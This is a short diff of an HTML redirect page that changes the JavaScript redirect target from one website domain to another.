@@ -9,7 +9,7 @@
 </head>
 <body>
 	<script>
-		window.location.replace('https://greenmonument.online/');
+		window.location.replace('https://globalstandardtrb.com');
 	</script>
 </body>
 </html>
